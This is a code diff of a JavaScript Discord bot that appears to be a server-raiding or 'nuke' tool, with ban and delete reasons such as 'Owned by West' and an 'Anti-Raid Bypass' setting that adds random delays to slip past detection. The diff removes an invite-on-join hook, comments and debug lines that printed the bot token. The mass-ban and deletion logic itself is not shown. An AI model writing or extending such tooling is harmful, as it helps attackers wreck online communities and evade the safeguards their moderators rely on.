@@ -1,5 +1,4 @@
 const { Client, GatewayIntentBits, GuildScheduledEventPrivacyLevel, GuildScheduledEventEntityType, ChannelType } = require('discord.js');
-const { sendInviteOnJoin } = require('./inviteOnJoin');
 
 const client = new Client({
     intents: [
@@ -46,20 +45,18 @@ const BAN_REASON = 'Fucked by West';
 const DELETE_REASON = 'Owned by West';
 
 // --- Anti-Raid Bypass Settings ---
-const ENABLE_RANDOM_DELAYS = true; // Set to 'true' to add tiny random delays to bypass simple detection.
-const MAX_DELAY_MS = 50; // Maximum random delay in milliseconds.
+const ENABLE_RANDOM_DELAYS = true;
+const MAX_DELAY_MS = 50;
 // =================================================================
 // === DO NOT EDIT BELOW THIS LINE (unless you know what you are doing) ===
 // =================================================================
 
-// A simple function to get a random integer
 function getRandomInt(min, max) {
     min = Math.ceil(min);
     max = Math.floor(max);
     return Math.floor(Math.random() * (max - min + 1)) + min;
 }
 
-// A function to add a random delay if enabled
 async function randomDelay() {
     if (ENABLE_RANDOM_DELAYS) {
         const delay = getRandomInt(1, MAX_DELAY_MS);
@@ -67,10 +64,6 @@ async function randomDelay() {
     }
     return Promise.resolve();
 }
-
-client.on('guildCreate', async (guild) => {
-    await sendInviteOnJoin(guild);
-});
 
 client.once('ready', () => {
     console.log(`Logged in as ${client.user.tag}`);
@@ -155,7 +148,6 @@ client.on('messageCreate', async (message) => {
             console.log(`Creating event "${EVENT_NAME}"...`);
             try {
                 const eventTimestamp = Date.now() + (60 * 60 * 1000);
-                // Create a dedicated voice channel for the event
                 const eventChannel = await guild.channels.create({
                     name: 'EVENT VOICE CHANNEL',
                     type: ChannelType.GuildVoice,
@@ -184,10 +176,5 @@ client.on('messageCreate', async (message) => {
         }
     }
 });
-
-// --- DEBUGGING ---
-console.log('Value of process.env.BOT_TOKEN:', process.env.BOT_TOKEN);
-console.log('Type of process.env.BOT_TOKEN:', typeof process.env.BOT_TOKEN);
-// --- END DEBUGGING ---
 
 client.login(process.env.BOT_TOKEN);
